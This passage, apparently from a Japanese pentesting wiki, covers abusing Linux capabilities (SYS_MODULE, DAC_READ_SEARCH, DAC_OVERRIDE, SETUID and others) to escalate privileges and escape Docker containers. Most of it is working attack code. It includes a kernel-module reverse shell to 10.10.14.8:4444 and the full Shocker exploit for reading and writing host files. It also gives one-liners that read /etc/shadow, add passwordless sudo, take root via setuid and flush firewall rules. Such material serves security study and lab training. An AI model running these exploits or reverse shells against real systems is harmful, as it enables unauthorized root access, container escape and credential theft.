デフォルトでは、**`modprobe`** コマンドはディレクトリ **`/lib/modules/$(uname -r)`** 内の依存関係リストとマップファイルをチェックします。\
これを悪用するために、偽の **lib/modules** フォルダーを作成しましょう：
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
次に、**以下に2つの例があるカーネルモジュールをコンパイルし、**このフォルダーにコピーします:**
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
最後に、このカーネルモジュールをロードするために必要なpythonコードを実行します：
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**例2：バイナリを使用した場合**

次の例では、バイナリ **`kmod`** がこの能力を持っています。
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
これは、**`insmod`** コマンドを使用してカーネルモジュールを挿入することが可能であることを意味します。この特権を悪用して **reverse shell** を取得するために、以下の例に従ってください。

**環境の例 (Dockerブレイクアウト)**

Dockerコンテナ内で有効な能力を確認するには、次のコマンドを使用します:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
内部の出力には、**SYS_MODULE** 権限が有効であることが示されています。

**リバースシェル**を実行する**カーネルモジュール**と、それを**コンパイル**するための**Makefile**を**作成**します：

{% code title="reverse-shell.c" %}
```c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```
{% endcode %}

{% code title="Makefile" %}
```bash
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
{% endcode %}

{% hint style="warning" %}
Makefile内の各make単語の前の空白文字は**スペースではなくタブ**でなければなりません!
{% endhint %}

`make`を実行してコンパイルします。
```
ake[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
最後に、シェル内で`nc`を開始し、別のシェルから**モジュールをロード**すると、ncプロセス内でシェルをキャプチャします:
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**この技術のコードは、** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com) **の「SYS_MODULE Capabilityの悪用」ラボからコピーされました。**

この技術の別の例は、[https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host) にあります。

## CAP\_DAC\_READ\_SEARCH

[**CAP\_DAC\_READ\_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は、プロセスが**ファイルの読み取りおよびディレクトリの読み取りと実行のための権限をバイパスする**ことを可能にします。その主な用途はファイル検索または読み取り目的です。しかし、これによりプロセスは `open_by_handle_at(2)` 関数を使用でき、プロセスのマウントネームスペースの外にあるファイルを含む任意のファイルにアクセスできます。`open_by_handle_at(2)` で使用されるハンドルは、`name_to_handle_at(2)` を通じて取得された非透明な識別子であるべきですが、改ざんに脆弱なinode番号などの機密情報を含む可能性があります。この能力の悪用の可能性、特にDockerコンテナの文脈においては、Sebastian Krahmerによってショッカーエクスプロイトで示されました。詳細は[こちら](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)で分析されています。
**これは、ファイルの読み取り権限チェックおよびディレクトリの読み取り/実行権限チェックをバイパスできることを意味します。**

**バイナリの例**

バイナリは任意のファイルを読み取ることができます。したがって、tarのようなファイルがこの能力を持っている場合、shadowファイルを読み取ることができます。
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**バイナリ2の例**

この場合、**`python`** バイナリがこの能力を持っていると仮定しましょう。ルートファイルをリストするには、次のようにします:
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
ファイルを読むためには、次のようにできます：
```python
print(open("/etc/shadow", "r").read())
```
**環境の例 (Dockerブレイクアウト)**

Dockerコンテナ内で有効な能力を確認するには、次のコマンドを使用します:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
内部の出力には、**DAC\_READ\_SEARCH** 権限が有効になっていることが示されています。その結果、コンテナは **プロセスのデバッグ** が可能です。

次のエクスプロイトの仕組みについては [https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) で学ぶことができますが、要約すると **CAP\_DAC\_READ\_SEARCH** は、許可チェックなしでファイルシステムを横断することを可能にするだけでなく、_**open\_by\_handle\_at(2)**_ に対するチェックを明示的に削除し、**他のプロセスによって開かれた機密ファイルに私たちのプロセスがアクセスできる可能性がある** ということです。

この権限を悪用してホストからファイルを読み取る元のエクスプロイトはここにあります: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c)。以下は、**読み取りたいファイルを最初の引数として指定し、それをファイルにダンプすることを可能にする修正バージョンです。**
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
{% hint style="warning" %}
このエクスプロイトは、ホスト上にマウントされている何かへのポインタを見つける必要があります。元のエクスプロイトはファイル /.dockerinit を使用しており、この修正されたバージョンは /etc/hostname を使用しています。エクスプロイトが機能しない場合は、別のファイルを設定する必要があるかもしれません。ホストにマウントされているファイルを見つけるには、mount コマンドを実行してください：
{% endhint %}

![](<../../.gitbook/assets/image (407) (1).png>)

**この技術のコードは、** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com) **の「DAC\_READ\_SEARCH Capabilityの悪用」ラボからコピーされました。**

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) は **スペイン** で最も関連性の高いサイバーセキュリティイベントであり、**ヨーロッパ** で最も重要なイベントの一つです。**技術知識の促進を使命として、** この会議は、あらゆる分野の技術とサイバーセキュリティの専門家が集まる熱い交流の場です。

{% embed url="https://www.rootedcon.com/" %}

## CAP\_DAC\_OVERRIDE

**これは、任意のファイルに対する書き込み権限チェックをバイパスできることを意味し、任意のファイルに書き込むことができます。**

特権を昇格させるために**上書きできるファイルはたくさんあります。** [**ここからアイデアを得ることができます**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges)。

**バイナリの例**

この例では、vim はこの能力を持っているため、_passwd_、_sudoers_、または _shadow_ のような任意のファイルを変更できます：
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**Example with binary 2**

この例では **`python`** バイナリがこの能力を持ちます。あなたはpythonを使って任意のファイルを上書きすることができます:
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**環境 + CAP\_DAC\_READ\_SEARCH（Dockerブレイクアウト）の例**

Dockerコンテナ内で有効な能力を確認するには、次のコマンドを使用します:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
まず最初に、ホストの任意のファイルを読み取るために[**DAC\_READ\_SEARCH能力を悪用する**](linux-capabilities.md#cap\_dac\_read\_search)の前のセクションを読んでください。そして、**エクスプロイトをコンパイル**します。\
次に、ホストのファイルシステム内に**任意のファイルを書き込む**ことを可能にする**次のバージョンのショッカーエクスプロイトをコンパイル**します：
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
In order to scape the docker container you could **download** the files `/etc/shadow` and `/etc/passwd` from the host, **add** to them a **new user**, and use **`shocker_write`** to overwrite them. Then, **access** via **ssh**.

**この技術のコードは** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com) **の「DAC\_OVERRIDE Capabilityの悪用」ラボからコピーされました。**

## CAP\_CHOWN

**これは、任意のファイルの所有権を変更できることを意味します。**

**バイナリの例**

**`python`** バイナリがこの能力を持っていると仮定すると、**shadow** ファイルの **owner** を **変更** し、**rootパスワード** を **変更** し、特権を昇格させることができます：
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
または、**`ruby`** バイナリがこの能力を持っている場合：
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP\_FOWNER

**これは、任意のファイルの権限を変更できることを意味します。**

**バイナリの例**

もしpythonがこの能力を持っている場合、shadowファイルの権限を変更し、**rootパスワードを変更**し、特権を昇格させることができます：
```bash
python -c 'import os;os.chmod("/etc/shadow",0666)
```
### CAP\_SETUID

**これは、作成されたプロセスの有効ユーザーIDを設定できることを意味します。**

**バイナリの例**

もしpythonがこの**capability**を持っている場合、特権をrootに昇格させるために非常に簡単に悪用できます：
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**別の方法:**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP\_SETGID

**これは、作成されたプロセスの有効グループIDを設定できることを意味します。**

特権を昇格させるために**上書きできるファイルがたくさんあります、** [**ここからアイデアを得ることができます**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges)。

**バイナリの例**

この場合、グループが読み取れる興味深いファイルを探すべきです。なぜなら、任意のグループを偽装できるからです：
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
ファイルを見つけて（読み取りまたは書き込みを通じて）特権を昇格させるために悪用できる場合、次のコマンドを使用して**興味のあるグループを偽装したシェルを取得**できます：
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
この場合、グループshadowが偽装されたため、ファイル`/etc/shadow`を読むことができます：
```bash
cat /etc/shadow
```
もし**docker**がインストールされている場合、**dockerグループ**を**なりすまし**、それを利用して[**dockerソケット**と通信し、特権を昇格させる](./#writable-docker-socket)ことができます。

## CAP\_SETFCAP

**これは、ファイルやプロセスに能力を設定することが可能であることを意味します**

**バイナリの例**

もしpythonがこの**能力**を持っている場合、特権をrootに昇格させるために非常に簡単にそれを悪用できます：

{% code title="setcapability.py" %}
```python
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```
{% endcode %}
```bash
python setcapability.py /usr/bin/python2.7
```
{% hint style="warning" %}
新しい能力をバイナリにCAP\_SETFCAPで設定すると、この能力を失うことに注意してください。
{% endhint %}

[SETUID能力](linux-capabilities.md#cap\_setuid)を持っていると、特権を昇格させる方法を見るためにそのセクションに移動できます。

**環境の例（Dockerブレイクアウト）**

デフォルトでは、**CAP\_SETFCAPはDocker内のコンテナ内のプロセスに与えられます**。何かをして確認できます:
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
この能力は**バイナリに他の任意の能力を与えることを可能にします**。したがって、**このページで言及されている他の能力のブレイクアウトを悪用して**コンテナから**脱出**することを考えることができます。\
しかし、たとえばgdbバイナリにCAP\_SYS\_ADMINとCAP\_SYS\_PTRACEの能力を与えようとすると、それらを与えることはできますが、**この後バイナリは実行できなくなります**：
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
[From the docs](https://man7.org/linux/man-pages/man7/capabilities.7.html): _Permitted: これはスレッドが仮定できる**有効な能力の制限されたスーパーセット**です。また、**CAP\_SETPCAP**能力を有効なセットに持たないスレッドによって継承可能なセットに追加できる能力の制限されたスーパーセットでもあります。_\
Permitted capabilitiesは使用できる能力を制限しているようです。\
しかし、Dockerはデフォルトで**CAP\_SETPCAP**も付与するため、**継承可能な能力の中に新しい能力を設定できるかもしれません**。\
しかし、この能力のドキュメントには次のように記載されています: _CAP\_SETPCAP : \[…] **呼び出しスレッドのバウンディング**セットからその継承可能なセットに任意の能力を追加します。_\
私たちはバウンディングセットから継承可能なセットにのみ追加できるようです。つまり、**CAP\_SYS\_ADMINやCAP\_SYS\_PTRACEのような新しい能力を継承セットに入れて特権を昇格させることはできません**。

## CAP\_SYS\_RAWIO

[**CAP\_SYS\_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html)は、`/dev/mem`、`/dev/kmem`、または`/proc/kcore`へのアクセス、`mmap_min_addr`の変更、`ioperm(2)`および`iopl(2)`システムコールへのアクセス、さまざまなディスクコマンドを含む多くの敏感な操作を提供します。この能力を介して`FIBMAP ioctl(2)`も有効になっており、[過去に問題を引き起こした](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html)ことがあります。マニュアルページによれば、これにより保持者は他のデバイスに対して**デバイス固有の操作を実行することができます**。

これは**特権昇格**や**Dockerブレイクアウト**に役立ちます。

## CAP\_KILL

**これは、任意のプロセスを終了させることが可能であることを意味します。**

**バイナリの例**

**`python`**バイナリがこの能力を持っていると仮定しましょう。もし**サービスやソケットの設定**（またはサービスに関連する任意の設定ファイル）を**変更することができれば**、バックドアを仕掛け、そのサービスに関連するプロセスを終了させて、新しい設定ファイルがバックドアと共に実行されるのを待つことができます。
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**Privesc with kill**

もしあなたがkill権限を持っていて、**rootとして実行されているnodeプログラム**（または別のユーザーとして） がある場合、あなたはおそらく**信号SIGUSR1**を送信して、それを**nodeデバッガー**を開かせ、接続できるようにすることができます。
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% content-ref url="electron-cef-chromium-debugger-abuse.md" %}
[electron-cef-chromium-debugger-abuse.md](electron-cef-chromium-debugger-abuse.md)
{% endcontent-ref %}

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) は **スペイン** で最も関連性の高いサイバーセキュリティイベントであり、**ヨーロッパ** で最も重要なイベントの一つです。**技術知識の促進**を使命とし、この会議はあらゆる分野の技術およびサイバーセキュリティ専門家の熱い交流の場です。

{% embed url="https://www.rootedcon.com/" %}

## CAP\_NET\_BIND\_SERVICE

**これは、任意のポート（特権ポートでも）でリッスンできることを意味します。** この能力を使って直接特権を昇格させることはできません。

**バイナリの例**

もし **`python`** がこの能力を持っていれば、任意のポートでリッスンでき、さらにそこから他のポートに接続することもできます（いくつかのサービスは特定の特権ポートからの接続を必要とします）。

{% tabs %}
{% tab title="Listen" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{% endtab %}

{% tab title="接続" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{% endtab %}
{% endtabs %}

## CAP\_NET\_RAW

[**CAP\_NET\_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 権限はプロセスが **RAW および PACKET ソケットを作成** することを許可し、任意のネットワークパケットを生成および送信できるようにします。これは、パケットの偽装、トラフィックの注入、ネットワークアクセス制御の回避など、コンテナ化された環境におけるセキュリティリスクを引き起こす可能性があります。悪意のある行為者は、これを利用してコンテナのルーティングに干渉したり、特に適切なファイアウォール保護がない場合にホストのネットワークセキュリティを侵害する可能性があります。さらに、**CAP_NET_RAW** は、RAW ICMP リクエストを介して ping などの操作をサポートするために特権コンテナにとって重要です。

**これは、トラフィックをスニッフィングすることが可能であることを意味します。** この権限を使用して直接特権を昇格させることはできません。

**バイナリの例**

バイナリ **`tcpdump`** がこの権限を持っている場合、ネットワーク情報をキャプチャするために使用できます。
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
注意してください、もし**環境**がこの能力を与えている場合、**`tcpdump`**を使用してトラフィックをスニッフィングすることもできます。

**バイナリ2の例**

以下の例は、"**lo**"（**localhost**）インターフェースのトラフィックをインターセプトするのに役立つ**`python2`**コードです。このコードは、[https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com)のラボ"_The Basics: CAP-NET\_BIND + NET\_RAW_"からのものです。
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP\_NET\_ADMIN + CAP\_NET\_RAW

[**CAP\_NET\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 権限は、保持者に **ネットワーク設定を変更する** 力を与えます。これには、ファイアウォール設定、ルーティングテーブル、ソケットの権限、および公開されたネットワーク名前空間内のネットワークインターフェース設定が含まれます。また、ネットワークインターフェースで **プロミスキャスモード** をオンにすることを可能にし、名前空間を越えたパケットスニッフィングを許可します。

**バイナリの例**

**pythonバイナリ** がこれらの権限を持っていると仮定しましょう。
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP\_LINUX\_IMMUTABLE

**これはinode属性を変更できることを意味します。** この能力を使って特権を直接昇格させることはできません。

**バイナリの例**

